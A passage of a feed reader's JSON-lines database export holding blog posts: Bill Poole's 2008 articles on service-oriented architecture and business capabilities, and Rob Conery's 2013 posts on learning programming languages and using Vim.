width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1261}}
{"k":"0000000084","o":"0000003700","v":"001"}
{"_id":1262,"_uid":1262,"_dt":1373742620973,"_s":"60573bdc87c80acc9a429810dde08f68"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/2d3e4hW4sA4/service-contract-stability.html","title":"Service Contract Stability","published":{"$wrap":"$date","v":1215441900002,"h":"2008-07-07T14:45:00.002Z"},"starred":false,"read":false,"content":"SOA as a style of architecture reduces coupling between services by mandating that services have no knowledge of each other's implementations.  Services communicate only by way of exchanging messages that conform to service contracts.  As such, service consumers are dependent only on a service provider's service contract, not its implementation.<br /><br />However if we do not take particular care in designing our service boundaries and responsibilities, and by extension its service contract, then we run the risk that our service contracts may themselves be highly dependent on a service's implementation. One such example of this is<a href=\"http://bill-poole.blogspot.com/2008/05/whitebox-services-are-bad.html\">white box services</a>.<br /><br />Consequently, we want to align our service contracts with concepts that are very stable.  With a<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>, services are exposed somewhat arbitrarily.  They do not contribute towards any defined broader architecture.  Therefore service contracts will have an arbitrary level of stability.<br /><br />Next on the list is<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>.  With this approach, service contracts are centred around applications.  They are expressed in terms of the application with which we are integrating.  Consequently if the scope of the application changes, or the application itself is exchanged for another (such as exchanging an Onyx CRM with MS CRM), the service contract is very likely to change.<br /><br />So what about<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">layered service models</a>?  In this case, we have atomic business tasks, business processes and data stores abstracted as services.  These concepts are not at all stable.  Businesses very often make changes in business processes that in turn require changes in how atomic business activities are defined and how data is represented.  With this approach we are very likely to find ourselves changing our service contracts as business processes are updated.<br /><br />But what about business capabilities?  Business capabilities are by their very nature incredibly stable.  Although a retail organisation may make regular changes as to<i>how</i>it goes about inventory management, the fact is that it will<i>always</i>have an inventory management capability.  Moreover, other capabilities within the enterprise don't care<i>how</i>inventory management is performed.  They only care that it<i>is</i>performed.<br /><br />Consequently, aligning our service boundaries (and by extension our service contracts) with business capabilities gives us an incredible amount of stability.  This is the basis of the self-contained process centric-service model introduced in an<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">earlier post</a>.<br /><br />By defining our services around business capabilities we achieve greater business agility by way of being able to update<i>how</i>business functions are performed without influencing other services in our enterprise.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/2d3e4hW4sA4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1262}}
{"k":"0000000084","o":"0000006200","v":"001"}
{"_id":1263,"_uid":1263,"_dt":1373742620973,"_s":"c34478fd01572f1d90f0e0a0c28f5251"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/ClGOm_-tQag/business-capabilities.html","title":"Business Capabilities","published":{"$wrap":"$date","v":1215532080001,"h":"2008-07-08T15:48:00.001Z"},"starred":false,"read":false,"content":"In my<a href=\"http://bill-poole.blogspot.com/2008/07/service-contract-stability.html\">last post</a>, I mentioned that we can achieve very stable service contracts by aligning our service boundaries with business capabilities.  But this then begs the question, what is a business capability?  In short, a business capability is something that an organisation<i>does</i>that contributes in some way towards the overall function performed by the organisation.<br /><br />The advantage of business capabilities is their remarkable level of stability.  If we take a typical insurance organisation, it will likely have sales, marketing, policy administration, claims management, risk assessment, billing, payments, customer service, human resource management, rate management, document management, channel management, commissions management, compliance, IT support and human task management capabilities.  In fact, any insurance organisation will very likely have many of these capabilities.<br /><br />This means that any organisation operating within the same vertical industry will have a remarkably similar capability map.  This is a result of the fact that<i>what</i>these organisations do and the services they offer are fundamentally the same.  What differs from one organisation to the next is<i>how</i>these capabilities are implemented.<br /><br />That is, the business processes, applications, data, technologies and human resources (including their roles, skills and knowledge) that support each capability will differ from one organisation to the next; but the nature of the capabilities themselves, the value they deliver, and their core responsibilities will not vary.<br /><br />This means that whether a capability is implemented as a series of completely manual processes executed by employees, whether the capability is completely or partially outsourced, or whether the capability is fully automated with IT systems does not change the nature of the capability itself.  Other capabilities within the organisation are concerned only with the fact that the capability is performed, not<i>how</i>it is performed.<br /><br />As such we can change the implementation of a business capability without affecting any other capabilities supporting the organisation.  This makes for a considerably more stable business architecture description.  One problem commonly faced by business architects is that the organisation continues to change and adapt during the process of mapping out the business processes.<br /><br />This is in part due to the fact that process maps in a typical business architecture tend to span multiple business capabilities.  This significantly increases the number of process maps that contain implementation details of a single business capability.  Consequently when we change the implementation of a business capability, there is a larger number of process maps that need to be updated.<br /><br />By limiting the scope of our process maps to a single business capability, we substantially reduce the number of process maps affected by a change in the implementation of a capability.  As a result, our business architecture description is more stable and by extension more manageable.<br /><br />Business capabilities are hierarchical in nature.  We can decompose a business capability into smaller capabilities that support the broader capability.  We only decompose a capability into smaller capabilities where there is sufficient distinctiveness between those sub-capabilities to warrant separate and distinct process maps to describe those sub-capabilities.<br /><br />Of course there are business processes that span multiple business capabilities.  However, those processes are realised as event driven process chains.  Each business process that executes within a business capability has the ability to raise business relevant events.  Other business processes that execute within other capabilities subscribe to these events in order to trigger the execution of these processes.<br /><br />As such, end-to-end business processes are realised implicitly by virtue of the event publications and subscriptions between processes defined within each business capability.  Note that this notion of business event publication and subscription is not a technology concern.  It is simply a stable means of describing how business processes execute within an enterprise.<br /><br />Now, this is a really nice way of modelling a business architecture.  But what is the relevance to SOA?  Well, when we apply the SOA style of architecture to the business architecture domain we are concerned with<a href=\"http://bill-poole.blogspot.com/2008/06/business-services.html\">business services</a>.  A business service is modelled around a business capability that has an appropriate level of coupling and cohesion.<br /><br />If we choose a business capability that addresses too many unrelated concerns, then we will have low cohesion.  If we choose a business capability that is too finely grained, we will have tight coupling between services as related concerns will be distributed across multiple business services.<br /><br />So here we see that business capability mapping is an extremely valuable tool for deriving the business service model for an organisation.  It is important to note that this entire discussion falls within the business architecture domain.  The technical components that support a business service fall into the domain of the application and technology architecture.<br /><br />We find that the business service model is an incredibly valuable tool for achieving alignment between the business and IT domains.  This is because this single model has equal relevance in both domains.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/ClGOm_-tQag\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1263}}
{"k":"0000000084","o":"0000004005","v":"001"}
{"_id":1264,"_uid":1264,"_dt":1373742620973,"_s":"80485cad6f2997ebe43541a1de64adc7"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/CaaUIxee4Ek/how-many-services.html","title":"How Many Services?","published":{"$wrap":"$date","v":1218036780001,"h":"2008-08-06T15:33:00.001Z"},"starred":false,"read":false,"content":"One of the questions I get asked rather frequently in my travels is how many services are appropriate in any given architecture?  Well this is one of those unfortunate situations where the answer is, it depends.  However there are some good rules of thumb that can lead you to determine whether you're on the right track in terms of defining your service model.<br /><br />In the field, the number of services we see in any given enterprise tends to vary wildly.  In some organisations there is only one service - theüberservice.  Other organisations have stated they have well over 10,000 services.  But how good are these architectures?  As I've<a href=\"http://bill-poole.blogspot.com/2008/05/soa-quality-spectrum.html\">previously stated</a>just because an architecture is service oriented doesn't make it good.<br /><br />We've discussed<a href=\"http://bill-poole.blogspot.com/2008/06/are-bad.html\">überservices</a>before and they are clearly not a good thing.  So we definitely want more than one service.  But 10,000?  How on earth did they achieve that figure?  Well at the end of the day the number of services you'll end up with is largely determined by the granularity of your services.  Fine grained services will result in more services than coarse grained services.  We've discussed<a href=\"http://bill-poole.blogspot.com/2008/04/service-granularity.html\">service granularity</a>before too.<br /><br />Ultimately the number of services you end up with will largely be determined by the flavour of SOA you pursue.  If you take the<a href=\"http://bill-poole.blogspot.com/2008/05/jbows-is-bad.html\">JBOWS approach</a>(not recommended), then you could end up with<i>any</i>number of services.  You're building services in a completely uncontrolled way that doesn't conform to any particular architecture.  Usually the longer you follow this path, the more services you'll end up with.  Hopefully you stop before you reach 10,000.<br /><br />If you go down the road of<a href=\"http://bill-poole.blogspot.com/2008/04/web-services-integration.html\">Service Oriented Integration</a>then you'll end up with the same number of services as you have applications you are trying to integrate.  If you have 400 applications in your enterprise, you'll end up with 400 services.  Again, I wouldn't recommend this approach.<br /><br /><a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad.html\">Layered service models</a>have to take the prize in this competition.  Due to the incredible fine granularity of services in this model you can literally end up with thousands of services!  This is yet another reason why I wouldn't recommend this approach.<br /><br />And finally we have<a href=\"http://bill-poole.blogspot.com/2008/05/layered-service-models-are-bad_20.html\">self-contained process-centric service models</a>.  With this approach services are centred around process-centric cohesive business capabilities.  The number of services you will end up with will depend on the overall complexity of your business model.  But about 10-20 services is a good rule of thumb.  Any more than 30 or 40 and I'd be raising the alarm bells.<br /><br />Another thing to note is that the size of the organisation (in terms of staffing levels) is not a major factor in determining the appropriate number of services.  The number of services will grow as the complexity of the business model grows.  Keep in mind though that sometimes the complexity of the business must grow in order to cater for increased staffing levels.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/CaaUIxee4Ek\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1264}}
{"k":"0000000084","o":"0000004696","v":"001"}
{"_id":1265,"_uid":1265,"_dt":1373742620973,"_s":"ba50949002f6baed2af98266f716e8ca"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/iv4cQfcuzzw/service-oriented-car-wash.html","title":"The Service Oriented Car Wash","published":{"$wrap":"$date","v":1217864940002,"h":"2008-08-04T15:49:00.002Z"},"starred":false,"read":false,"content":"I recently had the pleasure of discovering that<a href=\"http://www.opengroup.org/\">The Open Group</a>have an<a href=\"http://www.opengroup.org/projects/soa/\">SOA Working Group</a>, the mission of which is \"to develop and foster common understanding of SOA in order to facilitate alignment between the business and information technology communities.\"  This is a very significant step in coming to a consensus on the definition of SOA in both the business and IT domains.<br /><br />The group is putting together an SOA ontology, which will hopefully go a long way towards creating a standard definition for the main elements of SOA and their relationships to each other.  The draft ontology in its current form makes reference to an example business scenario based on an imaginary car washing business.  The scenario is outlined below.<br /><br /><i>\"Joe has a one-man business. He stands on a street corner with a sponge, a bucket of water, and a sign saying \"Car Wash $5\". A customer drives up to him and asks him to wash the car. Joe asks the customer for five dollars. The customer gives him five dollars. Joe washes the car, then says, \"That's all done now,\" and the customer drives away.\"</i><br /><br />The Open Group at present states that this example identifies a single service, which embodies a single repeatable business activity performed by Joe - washing the car.  The customer is identified as the service consumer.  The customer \"consumes\" the service when he or she pays the five dollars for the car to be washed.<br /><br />There are however some issues with this model.  Firstly, the service identified in the model consists only of a single business activity. Services modelled this way are far too finely grained, thus resulting in low cohesion and high coupling between services.  A business service represents an entire cohesive business function, which may contain many processes and activities.<br /><br />Secondly, the service model completely omits the Sales function.  Although we are looking at a one man business, there are two business functions here (each of which translate to a business service).  There are two different processes at play here –<b>Sell Car Wash</b>, and<b>Wash Car</b>.  The<b>Sell Car Wash</b>process involves two roles – the Customer and the Salesperson.  The<b>Wash Car</b>process involves only one role – the Car Washer.  Joe just happens to hold two roles – the Salesperson and Car Washer roles.<br /><br />As the model as described by The Open Group consists only of one process, it is unclear as to whether their model follows an event driven paradigm.  Modelling the business architecture around business services and events provides for a far more loosely coupled and maintainable business architecture than other approaches.<br /><br />The example business scenario calls for a single end-to-end business process spanning two business services.  This is best represented as<i>two</i>business processes separately defined, but connected via a single<i>business event</i>which we might call<i>Sale Completed</i>.  This is the end event of the<b>Sell Car Wash</b>process and the begin event of the<b>Wash Car</b>process.  This is illustrated in the EPC diagram below.<br /><br /><a href=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s1600-h/Business+Architecture.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://bp1.blogger.com/_Ulehi1qz3j0/SJcvdzYReiI/AAAAAAAAAD8/l-XGh5HG65Y/s400/Business+Architecture.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5230701681268849186\" /></a><br />Modelling our services this way has our Car Wash service as a consumer of our Sales service.  The customer is merely a participant in the Sales business service.  He or she is not a service consumer.<br /><br />Now although we could indeed model our business architecture as outlined by The Open Group, to do so would produce a Business Architecture with business processes spanning multiple business areas, thus having low cohesion.  This would produce a more unstable business architecture description and provide a poorer footing for our IT architecture.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/iv4cQfcuzzw\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1265}}
{"k":"0000000084","o":"0000003155","v":"001"}
{"_id":1266,"_uid":1266,"_dt":1373742620973,"_s":"0cd944db30ca1da24d49cc5198539fd9"}
{"subscription":{"$wrap":"$oid","v":11},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/-RByDg-Aib4/how-did-you-get-started-in-software.html","title":"How Did You Get Started in Software Development?","published":{"$wrap":"$date","v":1216461660003,"h":"2008-07-19T10:01:00.003Z"},"starred":false,"read":false,"content":"Rhys Campbell<a href=\"http://rhysc.blogspot.com/2008/07/how-did-you-get-started-in-software.html\">tagged me recently</a>asking how I got started with developing software.  Although I don't personally write software these days, I've certainly done my share of it in the past and I currently manage Change Corporation's body of knowledge in the area.<br /><br />So let's get started:<br /><br /><b>How old were you when you started programming?</b><br /><br />I can't really remember it was so long ago.  But I think I was about 16 years old.  I started writing \"demos\", which were effectively programs that did various visual effects (like flying through tunnels and what have you).  The demos were entered into demo competitions.  Very nerdy really.<br /><br />I also wrote a music player application that played music stored in the S3M format.  If anyone can remember, that was the Scream Tracker file format.  The player was written in 80386 assembler and natively managed Expanded Memory (if anyone can remember that from the days of the 286 computer), hardware interrupts, and direct memory access (DMA).  The player did real time digital mixing.<br /><br /><b>What was your first programming language?</b><br /><br />I first started writing programs in C, but soon moved into 80386 assembler, and C++.  Eventually I got into Visual Objects, Visual Basic, Java and then C#.  I've also dabbled in Smalltalk and Eiffel.<br /><br /><b>What was the first real program you wrote?</b><br /><br />I suppose this question depends on the definition of \"real\".  The first commercial application I wrote was a consignment management system I think for a freight company.  It was so long ago I can't really remember - but it was written in Visual Objects.<br /><br /><b>If you knew then what you know now would you have started programming?</b><br /><br />Well I'm not really programming at all these days, so I guess if I knew then what I know now then I'd be doing Enterprise Architecture.  Although it would be hard to get businesses to take me seriously in that capacity as a 16 year old.  If I knew I would eventually end up doing Enterprise Architecture, then yes I would indeed have started programming as it eventually got me to where I wanted to be.<br /><br /><b>What’s the most fun you’ve ever had... programming?</b><br /><br />Hard to say.  There's always been good times and bad.  I can't say that I've ever found commercial programming<i>fun</i>exactly.  I've always found it rewarding and enjoyable.  I would say that the demo programs I wrote many years ago were fun to write.  I wasn't being paid for it, so they must have been. :-)<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/-RByDg-Aib4\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1266}}
{"k":"0000000084","o":"0000007223","v":"001"}
{"_id":1267,"_uid":1267,"_dt":1373742620973,"_s":"e9b38b12e7989194a6810516166279b9"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/PIz2b8ykqmw/knowing-more-programming-languages-will-make-you-smarter","title":"Knowing More Programming Languages Will Make You Smarter","published":{"$wrap":"$date","v":1368457200000,"h":"2013-05-13T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>There's a thought in neuroscience/psychological circles that words are much more than sounds that represent things: they are the abstraction of our higher brain function. Words are language, code is language. Restricting yourself to one or two languages is limiting your cognitive abilities</p><p><img src='http://wekeroad.com/images/language_map.png'/></p><p><p><em>image from<a href=\"http://visual.ly/network-graph-programming-languages-influence\">http://visual.ly/network-graph-programming-languages-influence</a></em></p><h2>Words as a Conceptual Map</h2><p>There's a small bit of setup here - bear with me.<a href=\"http://www.radiolab.org/2010/aug/09/\">I relistened to one of my favorite RadioLab podcasts ('Words')</a>this weekend and had my mind blown, once again. They dug into<strong>what words mean</strong>to us and, according to the show, words are much more than expression vehicles.</p><p><strong>Words are the very structure of our higher reasoning</strong>.</p><p>In other words:<em>if you can't say it, you can't think it.</em>The words themselves are cognitive variables strung together to represent feeling, emotion, memory - abstract things made concrete by the words we put to them.</p><p>High-minded stuff and rather than regurgitate the whole show here - go listen if you haven't, it's very good. It left me quite inspired and I wondered if the the ideas in the show could extend to programming languages. Why not? Code is simply syntax laid on top of process that a machine needs to understand... hmmm....</p><p>We tell machines how to think - which directly reflects how we think. Writing code always seemed like such a\"machine-y\" thing to do, but I think that's not the case:<strong>Programming languages are true languages</strong>written for us to describe problems that a machine can understand.</p><p>These languages are stripped of nuance and imbued with functionality (loops, terse conditionals) for a myriad of problems.<em>How well do you speak code?</em></p><h2>A Thought Experiment</h2><p>Code is language, and how we solve problems with a given programming language directly relates to<strong>how we think in that language</strong>. This doesn't seem like an amazing revelation in and of itself - in fact I think you probably already understood this quite well.</p><p>But what if we reversed it? What if you couldn't think any other way - other than what that language<em>allowed you to think</em>. What if your coding language of choice<strong>was the abstraction over your programming thought process</strong>- that you actually lacked the mental faculties that lie outside of what that language can represent?</p><p>Let's say you walk into an interview and you get hit with a classic interview question (no, not FizzBuzz):<strong>write a routine that spits out Fibonacci numbers</strong>. It's something every dev has had to do at some point.</p><p>Now, slow your brain down and rewind. What language are you using to express this? What is that language<strong>allowing you to do</strong>.</p><p>If the only programming language you know is C# you're probably writing some LINQ in your mind and running a modulus. If you use Javascript you're probably doing something similar but maybe spread over two functions utilizing callbacks.</p><p>Rubyists out there might do something similar - favoring a more idiomatic approach with blocks/yield rather than a terse one-liner.</p><p><strong>Now write it using a Monad</strong>.</p><p><strong>Recursion?</strong></p><p>I'm sure a few of my readers could do all the above (LINQ, callbacks/blocks, Monad and Recursion) but I doubt that most of you can. This is due to the languages you know, the idioms they use, and<strong>the way those languages allow you to think about a problem</strong>.</p><h2>Expanding Your Thought Process</h2><p>I don't know anything about monads but I've done recursive programming in the past (sometimes not-intentionally). When I started using Ruby, I began to value the idiom of passing control back and forth using blocks and yield. You can do this in many languages - but for some reason it wasn't something I routinely did in C#.</p><p>The asynchronous nature of Javascript has awakened a part of my mind to evented programming. Again you can do this in many languages but it's idiomatic in Javascript and Node.</p><p>I can\"think\" in these terms and solve problems in ways I could never do when I knew only one language well (C#). At the time I liked the idea of\"going deep\" - of knowing a language so thoroughly that I could solve any problem with it and not clutter my mind with the different syntaxes of other languages.</p><p>I'm glad I didn't. And listening to that Radiolab podcast this last weekend made me understand why. I used to think it was that learning new languages would help me\"think differently\" but now I know it's more than that:<strong>I'm smarter now</strong>.</p><p>I'm not an egotistical guy and it hurts a bit to write that last paragraph - as if I'm suggesting that I'm smarter than people who know only one programming language -<strong>which is clearly not true</strong>. My point is only that<em>I'm smarter than I was 4 years ago</em>and the reason I think that is because I can solve problems in more ways than I could before and if my definition of\"intellect\" is accurate...</p><p><img src=\"/images/intellect.png\" alt=\"Definition of'Intellect'\"></p><p>... then yeah: I think it's OK to say I'm smarter than I was with respect to programming.</p><p>The thing I enjoy most about all of this is that I would never have thought about this until I heard that Radiolab podcast. They put the words to the very idea that words are our higher reasoning.</p><p>A lovely bit of recursive fun.</p><p><strong>Would I have recognized that recursion a few years ago? Hmmmm....</strong></p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PIz2b8ykqmw:WP2nGYIY1mU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PIz2b8ykqmw\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1267}}
{"k":"0000000084","o":"0000009781","v":"001"}
{"_id":1268,"_uid":1268,"_dt":1373742620974,"_s":"c9335cac38c0c29a151389fdde0199fb"}
{"subscription":{"$wrap":"$oid","v":52},"link":"http://feedproxy.google.com/~r/wekeroad/EeKc/~3/S7Y_jH8HtTE/vim-the-alpha-and-omega","title":"Vim: The Alpha and Omega","published":{"$wrap":"$date","v":1367161200000,"h":"2013-04-28T15:00:00.000Z"},"starred":false,"read":false,"content":"<p>I love experimenting with text editors and occasionally IDEs. In the last 6 months I've used no less than 5 different ones... each time I learn just how valuable Vim is to me.</p><p><img src='http://wekeroad.com/images/vim-commands.jpg'/></p><p><p><i>image from<a href=\"http://jonathanpberger.wordpress.com/2011/02/06/vi-tutorial-for-dvorak-typists/\">http://jonathanpberger.wordpress.com/2011/02/06/vi-tutorial-for-dvorak-typists/</a></i></p><h2>Skillz</h2><p>Consider:<strong>if you're a coder you type for a living</strong>. Code, email, docs - whatever. One of the biggestefficiency gains you can achieve is to<strong>become a faster editor</strong>. This is what Vim does best: help you edit Faster, Better, Stronger - and you can carry these skills with you to almost any editor available today.</p><p>Notice I didn't say that Vim makes you a\"faster typer\" - no a faster Editor. Modern IDEs have focused on that of late - and no one is better at it than JetBrains.</p><p>For the last 4 months I've been using<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>and<a href=\"http://www.jetbrains.com/webstorm\">WebStorm</a>and have fallen in love with them. WebStorm especially - if you're a Javascript person (Node or whatever) - it's a great deal at $49.</p><p><img src=\"http://www.jetbrains.com/webstorm/whatsnew/screenshots/60/html5outline.png\" alt=\"WebStorm\"></p><p>I'm not an intellisense person (since moving my focus away from .NET) but I do find it extremely helpful when working with new libraries. For instance: the Angular plugin for WebStorm helped me explore many of the\"ng-\" tags that I would not have seen otherwise.</p><p><img src=\"/images/angular-plugin.png\" alt=\"Angular Plugin\"></p><p>In the<a href=\"http://tekpub.com/productions/angular\">Tekpub Angular Series</a>I've been using WebStorm exlclusively and I've really enjoyed it.</p><p>Both RubyMine and WebStorms have interesting navigation schemes (I think this extends to Resharper for VS too):</p><ul><li>Cmd-O allows you to search by a class name</li><li>Cmd-Shift-O allows you to search by file name</li><li>Cmd-Option-O allows you to search by symbol (a method name, for instance)</li><li>Cmd-B takes you to a class or method declaration directly</li><li>In the gutter of a Rails project are\"go to view\" (when you're in a Controller) and\"go to Controller\" when you're in a view</li><li>Cmd-E opens a popup of recently edited files</li></ul><p>Really helpful stuff. In addition there are some great inspection features that offer\"squigglies\" (as Hanselman calls them) when methods aren't found, script files don't exist, etc. If you trust it - the editor will also give you refactoring options for your code...</p><p>These are helpful features - but are they helping me edit code faster? In some ways yes... in other ways...</p><h2>Enter Vim</h2><p><a href=\"http://codeofrob.com\">Rob Ashton</a>was out here in Hawaii visiting recently and he is a devoted Vim user. I was showing him WebStorm and all the neat things that go with it - but both of us agreed that we could code faster in Vim.</p><p><i><strong>Note</strong>: I know there are Vim plugins for JetBrains bits (and most other IDEs) - I'll get there.</i></p><p>While recording a video<a href=\"http://us2.campaign-archive1.com/?u=5e6e923ae72e1d1815a5df825&id=40b9d577bd&e=\">for our upcoming\"Career Reboot\" production at Tekpub</a>, I asked Rob\"what tools do you take with you while you hop the globe, journeyman coding\"?</p><p><img src=\"/images/reboot.jpg\" alt=\"Tekpub's Career Reboot\"></p><p>For the last year or so<strong>Rob has been travelling the planet</strong>, working on various projects for a few weeks at a time. His experiment was a simple one:</p><blockquote><p>Pay for my travel, lodging and food and I'll do the work for free</p></blockquote><p>With him was<strong>a single bag for his clothes and a backpack with 2 computers</strong>. He gave up his house and all of his furniture and put a few small things in storage and then set out - ending his journey here in Hawaii.</p><p>His work was varied and he wasn't sure for than a month at a time where he'd be next. Aside from the practical aspect - how do you prepare your machine for working in projects ranging from .NET to C++, Ruby to JavaScript. Rob hate's VMs as well - preferring to work on the native OS.</p><p><strong>He has one Windows Machine and one Mac</strong>. He wiped OSX off his Mac, however, and installed Ubuntu...</p><p>So what does Rob rely on for writing code?</p><blockquote><p>Vim</p></blockquote><p>For much of the code he writes, Vim will suffice, everytime. He can load up any set of plugins he needs to write effectively in Ruby, Javascript or Python. He knows the commands well and to watch him use the editor is a fascinating treat.</p><p>When working in Visual Studio, he uses<a href=\"http://visualstudiogallery.msdn.microsoft.com/59ca71b3-a4a3-46ca-8fe1-0e90e3f79329\">the VsVim plugin</a>and, according to him:</p><blockquote><p>If I didn't have these Vim plugins for VisualStudio I'd be screwed</p></blockquote><p>Most IDEs have a Vim\"overlay\". All of the JetBrains IDEs do, and so does SublimeText and ... well just about any editor you can think of.</p><h2>Vim, Everywhere</h2><p><strong>In terms of editing code, Vim won.</strong>The eternal Vim/Emacs war will rage on forever - but I don't think anyone can argue that,<strong>in terms of pure editing power: Vim does what it does, extremely well</strong>.</p><p>From your new shiny Mac Air to the Linux box in the cloud somewhere: open the terminal and hit\"vim\" and it's likely there, ready to edit config files or code.<strong>Vim is the Alpha and Omega editor</strong>- the beginning and the end.<strong>Vim is everywhere</strong>.</p><p><em>So it's back to Vim for me</em>. I like the JetBrains tools and I enjoy SublimeText 2 a lot... but I can move and edit in Vim at twice the speed.</p><p>You might be wondering:<strong>\"why not just use a Vim plugin dude?\"</strong></p><p>The inspections, plugins and\"helper\" functions in the JetBrains tools are interesting and helpful,<strong>but they come at a price</strong>(to me). It slows down the IDE, slows down typing, and many times it offers things I just don't want (like spelling corrections in my HTML files).</p><p>Often-times I feel like I spent an increasing amount of time diddling with the IDE more than the code. Looking up shortcuts, setting up configurations for testing, running and debugging... when I know how to do this already<strong>without the slick interface</strong>.</p><p>I like a pretty coding surface. I appreciate clean font rendering and seeing a project tree with all my code files and a fast, fuzzy file-finding feature.<em>And I can get all of that with Vim</em>.</p><p>I proved that to myself yesterday when editing a Rails project. Leader-P brought up<a href=\"https://peepcode.com/products/peepopen\">PeepOpen</a>,<code>\"/mailto\"</code>took me to a broken mail link.<code>\"c4w mailto:support\"</code>and the broken email was fixed.<code>RController pro[tab]</code>and I'm editing the ProductsController...</p><p>My Vim-glee was broken, however, when I realized I had forgotten the syntax for ActiveRecords eager-loading feature (include, include?, includes). Uh oh.</p><p>Rob put it very well when discussing IDEs:</p><blockquote><p>If a tool starts thinking for me, starts remembering the syntax that I need to write... I'll forget the code and start becoming reliant on that tool to do my work for me.</p></blockquote><p>This has happened to me ... quite often. When I was working in .NET it was nearly impossible for me to free-hand (without intellisense) simple structures like lambdas or a generic class definition using an interface. It's a syntax-heavy language and I can see how intellisense helps you with it.</p><p>The thing you lose, however, is<em>thinking in that language</em>. When the syntax is ready in your brain, you can<strong>think in code</strong>and sidestep the translation through the editor.</p><p>This is where Vim shines most and languages like Ruby flex their expressive muscle.<strong>You think the code, Vim expresses it directly</strong>.</p><p>The best part? You don't need to be using Vim to use Vim. Drop a plugin in a JetBrains IDE or Visual Studio and you're off (if you need to use those tools for whatever reason).</p><p>You never know, one day you might need to work in Clojure in Vilnius...</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=S7Y_jH8HtTE:ROmOmOZ4FDU:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/S7Y_jH8HtTE\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1268}}
{"k":"0000000084","o":"0000026003","v":"001"}
{"_id":1269,"_uid":1269,"_dt":1373742620974,"_s":"27f73fab8458f8a934b4ef39126ddd7a"}
